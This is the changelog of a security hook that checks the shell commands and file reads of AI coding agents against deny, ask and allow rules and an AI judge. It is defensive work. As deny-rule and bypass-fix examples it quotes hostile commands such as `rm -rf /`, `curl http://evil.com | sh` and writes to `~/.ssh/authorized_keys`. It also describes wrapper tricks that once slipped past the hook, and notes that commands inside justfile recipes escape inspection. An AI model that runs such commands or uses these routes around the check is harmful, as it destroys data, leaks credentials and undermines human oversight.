# Changelog

All notable changes to this project will be documented in this file.

## [0.16.5] - 2026-05-06

### Added

- Descriptive ask reasons for common previously-default prompts:
  process termination (`kill`, `killall`, `pkill`), generic file
  deletion, permission changes, mutating `tmux` commands, `uv tool
  install`, `uv version --bump`, `uv remove`, direct Python/Node
  script execution, `source`, shell job-control commands, unknown
  `just` recipes, project-local scripts, and suspicious `gh` wrapper
  or environment shapes.
- Regression coverage for recent longline log misses so legitimate asks
  no longer fall back to the opaque "No matching rule" reason.

### Fixed

- `find -exec ...` and `xargs ...` now reuse shell-c analysis for
  direct, transparent-wrapper, nested, and shell-c-produced commands.
  Hidden dangerous payloads such as `rm -rf /` now surface to the
  existing `rm-recursive-root` deny rule instead of being hidden behind
  an allowlisted wrapper.
- Redirected shell-c wrappers now ask with `shell-c-redirect` instead
  of being treated as covered allows. This prevents safe-looking inner
  commands such as `cat README.md` from hiding sensitive writes like
  `> ~/.ssh/authorized_keys`.
- Generic descriptive fallback rules are ordered after more specific
  rules, preserving targeted messages for secret deletion, forceful
  process termination, and world-writable permission changes.
- Opaque shell syntax now reports `Shell syntax is too complex to
  analyze safely`, and `longline check` labels those rows as
  `(opaque)` instead of `(default)`.

## [0.16.4] - 2026-05-05

### Docs

- README tagline now names both Claude Code and Codex CLI (the
  previous text only mentioned Claude Code despite v0.16 supporting
  both runtimes), and leads with the user-visible benefit — fewer
  approval interruptions for safe commands — rather than the
  enforcement framing.
- New "Design goal" paragraph in the README makes explicit that
  longline's purpose is speeding up development by minimising
  permission prompts for safe operations, with per-project
  allowlist customisation, rather than gatekeeping.
- "What it does" updated to note the `PreToolUse` hook covers both
  runtimes, and clarifies that Read/Grep/Glob path checks are
  Claude-only.
- The rolling release roadmap moved from
  `docs/2026-04-29-codex-adapter-prep-roadmap.md` to
  `docs/ROADMAP.md` so it sits next to `RELEASING.md` and is
  discoverable. Long-superseded design docs (the original project
  brief, all 2026-01/2026-02 plans, R4 test inventory output) moved
  to `docs/archive/`.

No code changes.

## [0.16.3] - 2026-05-05

### Docs

- README "Release" badge URL adds `?event=push` so it tracks the
  actual release path (tag-push events) rather than the default-branch
  latest run. The unfiltered URL was showing "failing" because it
  picked up an old failed `workflow_dispatch` run on `main` from
  February 2026; all real release runs were green.
- CHANGELOG entries for v0.16.1 and v0.16.2 cleaned of internal
  review-process notes so they describe user-facing changes only.

No code changes.

## [0.16.2] - 2026-05-05

### Added

- **Read-only `gh` classifier.** Argv-aware policy step that auto-allows
  provably read-only GitHub CLI invocations without consulting the
  trust-level allowlist. Eliminates the v0.16 parent-supervision pain
  point where every `gh api repos/.../contents/...` source-verification
  call required a parent turn.

  Read-only families covered (top-level invocations only — see
  "Wrapper coverage" below):
  - `gh api` when the effective method is GET, no body/field flags, no
    inline assignments, no redirects, no `-X<glued>` shorts, no
    `--hostname`, no `--cache`, no UnsafeString argv, and an endpoint
    is present.
  - `gh pr` view/list/diff/checks/status
  - `gh issue` view/list/status
  - `gh repo` view/list
  - `gh run` view/list/watch
  - `gh workflow` view/list
  - `gh release` view/list
  - `gh search` repos/issues/prs/code/commits
  - `gh auth status` (sans `--show-token` / `-t` / `-h` / `--hostname`)
  - `gh gist` view/list
  - `gh label list`
  - `gh status`
  - `gh secret list`
  - `gh variable list`
  - `gh cache list`

  Mutating commands continue to ask via the existing `gh-api-mutating`
  rule and `trust: full` allowlist entries: `gh pr create/merge/...`,
  `gh issue create/comment/...`, `gh release create/upload/...`,
  `gh workflow run/enable/disable`, `gh run rerun/cancel/delete`,
  `gh auth login/refresh/token/setup-git`, `gh secret/variable
  set/delete`, any `gh api` with non-GET method or body/field flags.

  `gh release download` deferred to R8 (filesystem policy stage).

  Audit attribution: `rule_id: "gh-readonly-classifier"`, reason
  `"read-only gh: <shape>"` (e.g. `"read-only gh: api (GET)"`).
  Greppable in `~/.claude/hooks-logs/longline.jsonl` and
  `~/.codex/hooks-logs/longline.jsonl`.

### Wrapper coverage

The classifier fires only on top-level invocations of `gh api` and
the new families (`release`, `search`, `gist`, `label`, `status`,
`secret list`, `variable list`, `cache list`). Wrapper-extracted
forms ask:

- `command gh api repos/foo`, `bash -c 'gh api repos/foo'`,
  `find -exec gh api ...`, `xargs gh api ...`,
  `echo $(gh api ...)`, `cat <(gh api ...)` — all ask.
- `gh api` with `PATH=/tmp`, `LD_PRELOAD=`, `GH_TOKEN=`,
  `--hostname`, `--cache`, redirects, or absolute-path `gh` — all ask.

The pre-existing `gh pr/issue/repo/run/workflow/auth` families keep
classifying through wrappers (so `command gh pr view 123` still
allows), matching their pre-R7 minimal/standard allowlist behavior.

### Removed

- 16 redundant read-only `gh ...` entries from `rules/cli-tools.yaml`.
  The new classifier handles them with broader trust-blind coverage.
  No behaviour regression on any pre-R7-allowlisted shape.

### Other

- Wrapper extraction in `src/parser/wrappers.rs` now carries outer
  inline assignments (e.g. `PATH=/tmp`) into the inner extracted
  command at three sites: `unwrap_transparent`, `extract_find_exec`,
  `extract_xargs_command`. Semantic correctness fix; affects any
  policy code that inspects assignments on extracted leaves.

No runtime behaviour changes outside `gh` policy.

## [0.16.1] - 2026-05-05

### CI

- **Sanitization gate.** Added a fail-closed pre-push verification step
  that scans the rewritten history (with merge diffs and committer
  headers via `--format=fuller`), working tree, tracked filenames, and
  annotated tag messages + tagger identity for the sensitive-string
  pattern. Aborts the GitHub mirror push on any hit. Pattern source-of-
  truth lives in `.gitlab-ci.yml`'s `SANITIZATION_PATTERN` env var; gate
  script is generic and ships publicly.
- **Identity rewrite during sanitization.** `git filter-repo` now runs
  with `--name-callback` and `--email-callback` so author / committer /
  tagger identity headers are redacted by the same pattern. Without
  this, commits authored under a sensitive identity would survive the
  path-strip and replace-text passes (which only operate on file content
  + commit messages) and trip the gate.
- **Commit and tag message rewrite.** `--replace-message` is applied
  alongside `--replace-text` so the same redaction table covers blob
  content AND commit / tag message bodies.
- **Replacement-table fixes.** Added `REDACTED` and `REDACTED`
  entries with longest-first ordering. Without these,
  `REDACTED` would partial-redact to `REDACTED.REDACTED.co`.
- **Cross-pipeline serialization.** Added `resource_group: github-mirror`
  on `sync_to_github` so close-together tag pipelines can't race the
  GitHub force-push. One-time operator setup
  (`process_mode=oldest_first`) documented in `docs/RELEASING.md`.
- **Strip-list defensive additions.** `.vscode/`, `.zed/`, `.cursor/`,
  `.aider.conf.yml`, `.envrc`, `.direnv/`, `.gitmodules`, `.lfsconfig`,
  `AGENTS.md`, `GEMINI.md`. None tracked today; defensive.
- **Annotated tag preserved on the public mirror.** Removed the
  `git tag -f "$CI_COMMIT_TAG"` line that was overwriting the
  filter-repo-rewritten annotated tag with a lightweight tag, losing the
  release message + signature.
- **GH Actions concurrency.** `cancel-in-progress` per ref so re-tagged
  publishes don't race.
- **Skip if version already published.** Workflow probes crates.io with
  the required User-Agent (per the data-access policy) and skips
  `cargo publish` on 200, fails loudly on 5xx/429. `--max-time 30`
  bounds hung TCP connects.
- **Version check via `cargo metadata`** instead of `grep | sed`.
  Filters by package name; robust against future workspace blocks.
- **`CARGO_HUSKY_DONT_INSTALL_HOOKS`** added to GH Actions env (parity
  with GitLab CI). Avoids spurious git-hook installs during CI test
  runs.
- Removed unused `stage: deploy` from `.freezedeployment` template.
- `sync_to_github` opts out of the cargo cache (no cargo invocation in
  that job).
- `git fetch --unshallow || true` replaced with explicit shallow check
  that fails loudly on actual unshallow failure.

### Docs

- New `docs/RELEASING.md` runbook (private-only, stripped from the
  public mirror) covering pre-release checklist with `process_mode`
  assertion, one-time setup (`glab variable set` flag/stdin form,
  `gh secret set` blocking-stdin behavior, default-branch correction,
  resource_group setup), and known footguns (protected-tag
  immutability, first-tag-on-new-mirror auto-trigger gap,
  yanked-version recovery, cancelled-run recovery, `refs/original`
  cleanup).
- README CI / crates.io / license badges. Badge label honestly reads
  "Release" rather than "CI" (the workflow runs only on tag pushes).

No runtime behavior changes. No Rust source touched.

## [0.16.0] - 2026-05-04

### Added

- New `longline hook codex` subcommand for OpenAI Codex hook integration.
  Bash-only in this release; `apply_patch` and MCP tool surfaces pass
  through to Codex's normal flow without policy evaluation, and will be
  policy-evaluated in a later release. Decision mapping per the readiness
  review: `PreToolUse` deny → block (`permissionDecision: "deny"` with
  reason); allow / ask → no decision. `PermissionRequest` allow →
  `behavior: "allow"`; deny → `behavior: "deny"` with `message`; ask →
  no decision.
- `runtime` field on audit log JSONL entries (`"claude"` or `"codex"`).
  Always present. Existing JSONL consumers that ignore unknown fields
  are unaffected; this is purely additive. New
  `logger::make_entry_with_runtime` is the only public constructor and
  forces every call site to be runtime-aware at compile time; the legacy
  `make_entry` shim was removed.
- `.codex/` added as a project-root marker for `find_project_root`
  alongside `.git/` and `.claude/`. Codex-only repos are discoverable
  without a Claude or git checkout. Closest-marker-wins precedence is
  preserved.
- Codex audit log path: `~/.codex/hooks-logs/longline.jsonl`. Existing
  Claude log path (`~/.claude/hooks-logs/longline.jsonl`) is unchanged.

### Changed

- The Codex adapter takes a fail-open posture: every hook-time error
  (rules manifest / global / project config load failure, malformed
  input, missing event name, evaluator panic) produces exit 0 + empty
  stdout + a single stderr line + a JSONL fail-open audit entry under
  `~/.codex/hooks-logs/`. The Claude adapter and bare `longline` are
  **unchanged** — they retain today's `permissionDecision: "ask"` JSON
  for stdin/parse errors and exit 2 for config-load errors.

### Notes

- The bare `longline` form (no subcommand) continues to dispatch to the
  Claude adapter for back-compat. New install docs (Claude or Codex)
  recommend the explicit `longline hook claude` / `longline hook codex`
  form. The bare form will be deprecated in a later release and
  eventually require an explicit `hook` subcommand.
- `Invocation::cwd()` now treats an empty string as "no cwd" so a
  `cwd: ""` payload from any runtime cannot be silently resolved against
  the longline process's own cwd by project-config discovery. Claude in
  practice always sends an absolute cwd, so this is a latent-bug fix
  rather than an observable behavior change for existing installs;
  mentioned for completeness. The `--ask-ai` code-extraction path was
  also hardened: an empty cwd now skips AI extraction entirely (was
  previously substituted to `"."`, which canonicalized against the
  launcher's cwd).

## [0.15.9] - 2026-05-04

### Internal

- GitLab CI's `sync_to_github` job now runs only on tag pipelines.
  `release-finish` does `git push && git push --tags`, which used to
  trigger two near-identical sync runs in parallel; the second one would
  always finish with `Everything up-to-date` because the first had
  already pushed the same filtered HEAD. `test_longline` and
  `build_longline` still run on both master and tag refs (so master
  commits keep getting green-on-master coverage); only the GitHub push
  is gated. Cuts ~7 minutes of redundant CI per release and removes the
  ambiguity of having two pipelines to watch for one release.

## [0.15.8] - 2026-05-04

### Fixed

- `cd_following` test fixtures relocated from
  `CARGO_MANIFEST_DIR/target/test-tmp/...` to `std::env::temp_dir()` so
  they pass `is_under_safe_root` on hosts where the repo checkout lives
  outside `$HOME` (notably the GitLab runner at `/builds/...`). v0.15.7's
  release pipeline failed at the `test_longline` job for this reason and
  never reached the `sync_to_github` step, so the public mirror missed
  v0.15.7. This release ships every change accumulated since v0.15.6 plus
  the test-portability fix.

## [0.15.7] - 2026-05-02

### Added

- Allowlisted chezmoi's read-only subcommands (`managed`, `diff`, `status`,
  `cat`, `doctor`, `dump`, `data`, etc.). Mutating subcommands (`apply`,
  `init`, `add`, `edit`, `update`, `forget`, `merge`) keep asking.
- AI judge resolves `python -m foo.bar` to in-repo source via the flat-layout
  and `src/`-layout candidate chains, so module-form invocations of repo code
  (`uv run python -m tests.fixtures.foo`, `python -m afterhours hook`, etc.)
  reach the LLM with the actual file body instead of asking the user.
  Installed-package modules (`pip`, `pytest`, `http.server`) intentionally
  keep asking.
- AI judge follows `cd <literal-path> && <next>` so commands prefixed by a
  literal `cd` see the post-cd directory when the script extractor looks for
  relative paths. Confined to `$HOME` / `/tmp` / `$TMPDIR`. Variables,
  command substitutions, subshells, `cd` after the first `&&`, backslash-
  escaped paths (`cd My\ Repo`), and `cd` with redirects all fall back to
  the original cwd by design — these gaps are documented in the source
  comment on `effective_cwd_for_extract`.

### Internal

- GitLab CI gains a reusable `.freezedeployment` template and wires it into
  `sync_to_github` (the de-facto deploy step). Setting the `CI_DEPLOY_FREEZE`
  CI/CD variable to any non-empty value flips the job to manual and fails
  it on run, even if someone clicks the manual button. Test and build jobs
  are intentionally not gated.
- Refactored the `--ask-ai` extraction wire-in into a single helper
  `extract_code_with_cwd_following` so integration tests exercise the
  production code path (a `raw_cwd` vs `effective_cwd` typo regression now
  fails a test). Two new integration tests cover both the direct extraction
  path and the `or_else` wrapper-unwrap fallback.

## [0.15.6] - 2026-05-01

### Added

- Project-level longline overlay at `.claude/longline.yaml` that denies any
  direct `git push` from inside the longline repo itself. All releases now
  flow through `just release-prep <level>` → edit `CHANGELOG.md` →
  `just release-finish`, shipping the version bump, tag, and push atomically.
  `just release-finish` is unaffected because longline only sees the command
  Claude submits to the Bash tool; the inner `git push` lives inside the
  justfile recipe and is invisible to the hook.

## [0.15.5] - 2026-05-01

### Added

- Allowlisted `git ls-remote` as a read-only ref query at minimal trust,
  alongside `git ls-files` and `git ls-tree`. Surfaced from a JSONL-log audit
  that found `git ls-remote --tags origin` (often piped to `grep`/`tail`)
  repeatedly hitting "no matching rule" and asking for confirmation.

## [0.15.4] - 2026-05-01

### Internal

- Reorganized the integration test harness and test files so Claude-specific
  helpers are explicit ahead of future adapter work.

## [0.15.3] - 2026-04-30

### Internal

- Split config schema/loading, overlay discovery, prompt validation, and
  finalization into focused config modules.
- Moved Claude audit log path ownership into a Claude runtime helper.
- Evaluator now receives finalized config and an explicit audit log path
  instead of discovering config or runtime filesystem paths.

## [0.15.2] - 2026-04-29

### Internal

- Isolated Claude hook protocol parsing, mapping, and output rendering into a
  dedicated adapter module without changing hook behavior.
- Removed generic Claude-shaped hook wire types from shared modules as
  preparation for future adapter work.

## [0.15.1] - 2026-04-29

### Changed

- Refactored hook evaluation behind a neutral evaluator API so Claude hook
  decoding/encoding stays in the CLI while shared policy decisions, config
  finalization, audit logging, and AI-judge orchestration live outside the
  Claude wire layer.
- Moved shared decision types into a domain module as preparation for future
  adapter support.
- Added home-scoped audit logging helpers so evaluator tests can verify logging
  behavior without writing to the developer's real home directory.

### Fixed

- Preserved opaque shell-command behavior during the evaluator extraction:
  unrecognized shell structure still returns `ask` with the existing
  "Unrecognized command structure" reason instead of becoming a parse error.
- Preserved unsupported non-Bash hook passthrough behavior, including config
  validation failures before returning `{}`.
- Ensured `--ask-ai-lenient` still activates the AI judge path when strict
  `--ask-ai` is not set.

### Internal

- Added evaluator-level regression coverage for shell allow/deny/ask outcomes,
  parser-error logging, path invocations, AI-judge flow, and hook protocol
  stdout/stderr boundaries.
- Added release-planning documentation for the staged adapter-prep cleanup.

## [0.15.0] - 2026-04-27

### Changed

- AI judge: project's `.claude/longline.yaml` may now supply the entire reasoning prompt under `ai_judge.prompt`. When set, longline substitutes four placeholders (`{language}`, `{code}`, `{cwd}`, `{extractor_context}`) and appends the response-format directive — built-in safety rules are not folded in. The built-in strict and lenient templates remain as fallbacks for repos that do not set `ai_judge.prompt`.
- Placeholder substitution is now single-pass; replacement values are no longer re-scanned for placeholder tokens (e.g., `{code}` containing `{cwd}` is preserved verbatim).
- AI judge breadcrumb on stderr now distinguishes "(project prompt)" from "(lenient)" and the strict default.

### Added

- Required placeholders `{language}`, `{code}`, `{cwd}` are validated at config-load time; missing any one fails with exit code 2 and a path-qualified error message.
- `ai_judge.prompt` is rejected in global config (`~/.config/longline/longline.yaml`); it must be project-specific.

### Removed

- `ai_judge.context` field — replaced by `ai_judge.prompt`. Migration: rewrite the YAML to put the full prompt body under `prompt:` with the three required placeholders.
- Floor / wrapper / nonce / sanitization machinery in the AI judge prompt assembly. The prior design folded a project-supplied snippet into a built-in template wrapped with non-overridable rules; that produced conflicting signals to the judge model and caused ASKs on legitimate domain work. The new design has the project own the entire prompt, so there are no conflicting voices to reconcile. See `docs/plans/2026-04-26-ai-judge-prompt-override-design.md` for the full reasoning.

## [0.14.0] - 2026-04-23

### Added

- OpenAI `codex` CLI allowlist (new `rules/codex.yaml`). Allowlists the
  non-interactive `codex exec` entrypoint (including `codex exec review` and
  `codex exec resume` subcommands) plus `codex --version` / `--help`. Bare
  `codex` (interactive TUI), `codex login`, and config-mutating subcommands
  remain gated and fall through to the default `ask`. Safety for
  `codex exec` rests on the caller's codex profile
  (`sandbox_mode = "read-only"`, `approval_policy = "never"`), not on this
  allowlist. Unblocks the common `codex-review` skill launcher which sets
  env vars, prepares output paths, and invokes
  `CODEX_HOME=… codex --profile <name> exec …` in one compound command.
- Codex global value-flag stripping in the allowlist matcher so
  `codex --profile review exec …`, `codex -c model="gpt-5.4" exec …`, and
  `codex --model gpt-5.4 exec …` all reduce to `codex exec …` for matching.
  Stripped flags: `--profile`, `--model`, `-m`, `--config`, `-c`.

### Internal

- New `strip_codex_global_flags` in `policy::allowlist`, mirroring the
  existing git `-C <path>` handling. Codex is deliberately not added to the
  transparent-wrapper table — it is not a wrapper (it does not delegate to
  an inner command), so `unwrap_transparent` must not treat `codex exec`
  as an extraction target.
- `find_matching_entry` gains a codex branch alongside the git branch that
  invokes the strip function when any supported global value-flag is
  present in argv.
- New `golden_codex` test suite (10 cases) covering the canonical launcher,
  `--profile` and `CODEX_HOME` prefixed invocations, subcommands, and the
  negative case for `codex login`.

## [0.13.0] - 2026-04-23

### Added

- Per-repo `ai_judge.context` in `.claude/longline.yaml` customizes the AI
  judge's prompt with domain-specific hints. The judge sees a sanitized
  `<project_context_XXXXXX>` wrapper with a user-provided preamble, the
  user-supplied text, and a restated non-overridable safety floor (secrets,
  subprocess, dynamic eval, package installs, writes outside repo/temp dirs).
  Project context appends to — not replaces — any extractor-emitted context
  (Django shell tag, curl-pipe provenance), preserving tactical safety
  guidance. User input is stripped of `</project_context_XXXXXX>` closing-tag
  patterns to defend against delimiter injection.
- `LONGLINE_AI_JUDGE_DEBUG` environment variable: when set to a non-empty
  value, strips `--ephemeral` from the codex invocation so AI-judge sessions
  are persisted to `~/.codex/sessions/` for post-mortem inspection. Off by
  default. Intended as a narrow dev/debug knob, not a user-facing feature.

### Internal

- `finalize_config` now returns `FinalConfig { rules, project_ai_context }`
  so per-repo AI-judge context can be threaded through the hook flow
  without living on `RulesConfig`.
- New `ProjectAiJudgeConfig` sub-struct on `ProjectConfig`; deserialized
  with `deny_unknown_fields` for fail-closed typo handling.
- New private prompt helpers: `generate_nonce` (time + atomic counter,
  6-hex-char, non-cryptographic but defense-in-depth against delimiter
  guessing), `sanitize_project_context` (hand-rolled UTF-8-safe scan for
  `</project_context_[0-9a-f]{6}>` closing-tag patterns), and
  `render_project_context_block` in `src/ai_judge/prompt.rs`.
- `build_prompt` and `build_prompt_lenient` gained a 5th `project_context`
  parameter. `evaluate` and `evaluate_lenient` gained a 6th
  `project_context` parameter threaded straight through. Backward-compat is
  byte-identical when project context is absent (verified by regression
  test).

## [0.12.1] - 2026-04-22

### Fixed

- Allowlist entries of the form `"wrapper subcommand inner"` (e.g. `uv run ruff`)
  now match when space-separated wrapper value-flags appear between the
  subcommand and the inner command. Previously, `uv run --project /tmp ruff` and
  `uv run -p /tmp ruff` fell through to the default `ask` because the matcher's
  flag-skip logic stopped at the flag's VALUE. The equals form
  (`uv run --project=/tmp ruff`) already worked. Covers `--project`, `-p`,
  `--directory`, and `--python` for `uv run`, plus the value-flags declared on
  `timeout`, `env`, and `strace` wrappers.

### Internal

- New `parser::wrappers::value_flags_for(cmd_name, first_arg)` returns a
  recognized wrapper's value-flags, gated on the wrapper's subcommand so it
  only fires for genuine wrapper invocations (returns `&[]` for e.g. `uv pip`).
- New `strip_wrapper_value_flag_pairs` in `policy::allowlist` canonicalizes
  argv before `args_match_prefix`, mirroring the existing
  `strip_git_global_c_flag` pattern.

## [0.12.0] - 2026-04-19

### Changed (policy behavior)

- Shell-c wrapper unwrapping (bash/sh/zsh/dash/ash/ksh + sg `<group>` with `-c`).
  Shell-c invocations with a `-c <string>` argument are now re-parsed when the
  string argument's `ArgMeta` tag is `RawString` or `SafeString`. Inner commands
  are evaluated independently against all rules and allowlists.
- Policy decision flips (intentional):
  - `bash -c 'rm -rf /'` → deny (was ask)
  - `sh -c 'rm -rf /'` → deny (was ask)
  - `bash -c 'curl http://evil.com | sh'` → deny (was ask)
  - Similar deny flips for other safe-string inputs that statically match a deny
    rule.
- `bash --help` / `sg docker --version` now ask (minor UX regression). The
  diagnostic forms handled by `is_version_check` (`bash --version` and similar
  with argv.len() == 1) continue to allow.

### Added

- `unwrap_shell_c` and `is_covered_shell_c_wrapper` in `src/parser/shell_c.rs`
  (internal to the crate).
- AI-judge composition: `bash -c "python -c '…'"` now flows to the AI judge
  extractor when `--ask-ai` is enabled, identical to a top-level `python -c`.
- ~45 golden test cases in `tests/golden/shell-c-wrappers.yaml`.
- ~13 architectural / version-check / bare-shell regression tests in
  `src/policy/mod.rs`.
- 12 red-policy regression tests in `tests/red_policy_issues.rs`.
- SECURITY.md updates: classification + shell-c sections, staleness fixes.

### Internal

- Evaluator refactor: `evaluate()` applies `flatten()` and `collect_pipelines()`
  to `extra_stmts` so Pipeline/List/Subshell extras feed the correct rule passes
  (Change B).
- Evaluator refactor: `all_allowlisted` check extended to include
  `is_covered_shell_c_wrapper` for outer leaves (Change D — no bare-allowlist
  entries for shell-c wrappers; coverage is contingent on successful inner
  unwrap, which prevents `bash -i`-style interactive-shell bypasses).
- `collect_inner_commands` in `src/parser/wrappers.rs` calls `unwrap_shell_c` in
  a new branch with shared `MAX_UNWRAP_DEPTH = 16` depth budget.
- CLI AI-judge pipeline iterates `extract_inner_commands` output as a fallback
  for `extract_code` (Change C).

### Unchanged

- `eval "..."` remains opaque (variadic concatenation out of scope).
- `rules/core-allowlist.yaml` — no new entries. Shell-c wrappers are NOT
  bare-allowlisted; coverage is mediated by the evaluator.

## [0.11.0] - 2026-04-19

### Changed (breaking)

- `SimpleCommand.argv` is now `Vec<Arg>` instead of `Vec<String>`. Each `Arg` carries both the original text and an `ArgMeta` classification derived from the tree-sitter AST node that produced it (`PlainWord`, `RawString`, `SafeString`, `UnsafeString`). Downstream consumers of the `longline` library should migrate argv accesses to `argv[i].text` / `argv[i].as_ref()`.

### Added

- `Arg` and `ArgMeta` public types in `longline::parser`.
- `Arg::plain(...)` helper for tests.
- `impl AsRef<str> for Arg`.
- Classification unit tests covering all recognised tree-sitter-bash argv node kinds (~29 tests).

### Internal

- `classify_arg_node` and `classify_string_node` in `src/parser/helpers.rs`.
- `convert_arg_node` in `src/parser/convert.rs`.
- `unwrap_transparent`, `extract_find_exec`, `extract_xargs_command` now slice-preserve original `Arg` values (including `ArgMeta`) when synthesizing inner commands. Dedicated meta-preservation unit tests cover all three paths.

### Compatibility

No changes to policy decisions. All existing golden, integration, and red-policy tests pass unchanged.

## [0.10.2] - 2026-04-18

### Fixed

- AI judge: update default codex model from `gpt-5.1-codex-mini` (delisted and rejected for ChatGPT-account auth) to `gpt-5.4-mini`, which is right-sized for safety classification of inline interpreter code

## [0.10.1] - 2026-04-07

### Fixed

- AI judge: add `--full-auto`, `--ephemeral`, `--skip-git-repo-check`, and `--enable fast_mode` to default codex exec command — fixes hangs and unparseable responses caused by codex stalling on null stdin without auto-approval

## [0.10.0] - 2026-04-06

Longline now evaluates Read, Grep, and Glob tool calls instead of passing them through to Claude Code's built-in permission system. Most file reads and searches are auto-allowed; credential stores are escalated to ask.

### Added

- Read tool support — evaluates `file_path` against sensitive path patterns
- Grep and Glob tool support — evaluates `path` field against the same patterns
- Sensitive path protection for `/.ssh/`, `/.aws/`, `/.gnupg/`, and `/etc/shadow`
- 30 new integration tests for read-only tool evaluation
- `path` and `pattern` fields added to `ToolInput` deserialization

## [0.9.2] - 2026-04-05

Fixes for false-positive `ask` decisions discovered from production hook logs.

### Fixed

- Add `read` builtin to core allowlist — `find | while read f; do ...; done` no longer asks
- Recover tree-sitter ERROR nodes from backtick-in-regex patterns — `grep -oE "Host(\`[^`]+\`)"` no longer produces Opaque/ask
- Skip flag-like argv elements when matching multi-word allowlist entries — e.g. `ip -br addr show` now matches `ip addr show`, `tmux -v ls` matches `tmux ls`

## [0.9.1] - 2026-03-25

Parser and security improvements based on audit of production hook logs.

### Added

- Parser handles `declaration_command` nodes: `export`, `declare`, `local`, `readonly`, `typeset` are now parsed as `SimpleCommand` instead of falling through to `Opaque`
- Parser handles `unset_command` nodes: `unset` and `unsetenv` parsed as `SimpleCommand`
- `command` and `builtin` added as transparent wrappers — inner commands are evaluated by rules (fixes bypass where `command rm -rf /` was `ask` instead of `deny`)
- `command` and `builtin` added to core allowlist at minimal trust
- Process substitutions `<(...)` now have inner commands evaluated alongside command substitutions `$(...)`
- find -exec and xargs extracted commands are now unwrapped through transparent wrappers before evaluation
- 100+ new golden tests covering shell builtins, process substitutions, find-exec/xargs wrappers, and security regression scenarios
- 14 new parser unit tests
- Static analysis boundary documentation in SECURITY.md

### Fixed

- `export FOO=bar && ls` no longer produces `Opaque` — compound commands containing declaration builtins are properly parsed
- `command rm -rf /` now correctly denies instead of asking (security fix)
- `echo <(rm -rf /)` now correctly denies instead of allowing (security fix)
- `find . -exec command cat .env ;` now correctly denies instead of allowing (security fix)
- `echo foo | xargs timeout 30 cat .env` now correctly denies instead of allowing (security fix)

### Security

- `source`/`.` are intentionally NOT added to the core allowlist — secrets.yaml deny rules only cover `cat/less/more/head/tail/bat`, so allowlisting source would let `source ~/.ssh/id_rsa` through unchecked. Security regression tests enforce this.

## [0.9.0] - 2026-03-07

### Added

- Allowlist entries for `git diff-tree` (read-only git plumbing command)
- Allowlist entries for `yamllint` and `editorconfig-checker` (standalone and `uv run` variants)

### Changed

- Split `interpreters.yaml` into language-specific rules files: `python.yaml`, `rust.yaml`, `node.yaml`, `just.yaml`
- `interpreters.yaml` now only contains Ruby version checks as a catch-all for misc interpreters
- Reorganize golden tests to mirror rules file structure (rename/split files to match their corresponding rules files)

## [0.8.1] - 2026-02-23

### Added

- Allowlist entries for `pfp` CLI (read-only subcommands at minimal trust, mutating ops at full trust)
- Allowlist entries for `tmux` read-only subcommands (`list-sessions`, `list-windows`, `list-panes`, `capture-pane`, etc.)
- Allowlist entries for `rustup` read-only subcommands (`show`, `check`, `toolchain list`, etc.)
- Allowlist entry for `pstree` (read-only process tree inspection)
- Allowlist entries for `uv run python -m pytest` and `uv run python3 -m pytest`
- Allowlist entries for `just release-prep`, `just release-finish`, `just install` recipes
- Allowlist entry for `glp retry` at full trust
- Golden tests for all new allowlist entries including negative tests for mutating operations

## [0.8.0] - 2026-02-22

Pipeline stage flag matching and internal refactoring.

### Added

- Pipeline stage matchers now support `flags` constraints (`any_of`, `all_of`, `none_of`, `starts_with`), enabling rules to match pipelines based on both command names and their flags
- AI judge context now includes the full pipeline source for better evaluation of inline interpreter code
- Edge case golden tests for pipeline stage flag matching

### Changed

- `wget | interpreter` rule split into two: bare `wget` without `-O-` is denied outright, while `wget -O- | interpreter` uses inline-ask for AI evaluation
- Extracted shared `flags_match` helper from duplicated logic in `matches_rule` and `stage_flags_match`, reducing ~85 lines of duplication
- Deleted redundant `stage_flags_match` function; pipeline flag matching now calls `flags_match` directly

## [0.7.3] - 2026-02-21

### Changed

- Upgrade tree-sitter 0.24→0.26 and tree-sitter-bash 0.23→0.25 for improved error recovery, grammar correctness fixes (arithmetic expansion parsing), and continued upstream maintenance
- Replace deprecated `serde_yaml` with `serde_norway`, a maintained fork recommended by RustSec (RUSTSEC-2025-0068)
- Update all transitive dependencies to latest compatible versions

### Fixed

- `just release-prep` sed command now works on both macOS and Linux

## [0.7.2] - 2026-02-21

### Fixed

- Bare variable assignments like `VAR=$(date)` and `OLD=$(git show ... | sed ... | sort)` were always getting "ask" even when all embedded commands are allowlisted. The `is_allowlisted()` check requires a command name, but bare assignments have no command name. Now bare assignments are treated as safe when all their embedded substitutions pass the allowlist check. Dangerous substitutions like `VAR=$(cat .env)` still correctly deny.

### Added

- `mktemp` added to core allowlist (was missing, caused unnecessary "ask" on temp-dir setup scripts)
- 16 golden tests and 12 integration tests for bare assignment handling, including real-world scripts from production logs

## [0.7.1] - 2026-02-21

### Fixed

- Release process: `git-cliff -o` was regenerating the entire changelog from commit messages on every release, destroying manually curated entries (happened at v0.1.13, v0.4.1, v0.5.1, v0.7.0)
- Split `just release` into `just release-prep` / `just release-finish` so changelog edits and diffs can be reviewed before committing
- Restored all manually curated changelog entries lost across 4 releases

## [0.7.0] - 2026-02-21

Integration test framework overhaul. Split monolithic test file into focused modules and added 45 new config-driven integration tests.

### Added

- 45 new config-driven integration tests covering safety level overrides, trust level overrides, allowlist extensions, disable_rules, custom project rules, config precedence, config isolation, and real-world ops/automation config regression tests
- `assert_cmd`, `assert_fs`, `predicates` dev dependencies for improved test ergonomics
- Shared `TestEnv` builder in `tests/common/mod.rs` for isolated test environments with project/global config support

### Changed

- Split monolithic `integration.rs` (2144 lines, 86 tests) into focused test files: `hook_protocol.rs` (26), `subcommands.rs` (30), `trust_safety.rs` (8), `wrapper_allowlist.rs` (5), `config_integration.rs` (17)
- Disabled git-cliff auto-generation in release process to prevent destruction of manually curated changelog entries
- Split `just release` into `just release-prep` / `just release-finish` for manual review before commit

## [0.6.3] - 2026-02-20

### Fixed

- Allowlist entries for wrapped commands with multi-word subcommands (e.g. `"uv run prefect config view"`) were not matching because `is_covered_by_wrapper_entry()` only checked the last token of the entry against the inner command name; now checks all entry tokens

## [0.6.2] - 2026-02-19

### Added

- Compound allowlist entry matching for transparent wrappers via `is_covered_by_wrapper_entry()` -- entries like `"uv run yamllint"` now correctly allow the wrapped inner command

### Fixed

- Wrapper allowlist entries were not covering unwrapped inner commands; the outer leaf and inner leaf are now both checked against compound entries (GitLab #1)

## [0.6.1] - 2026-02-18

### Fixed

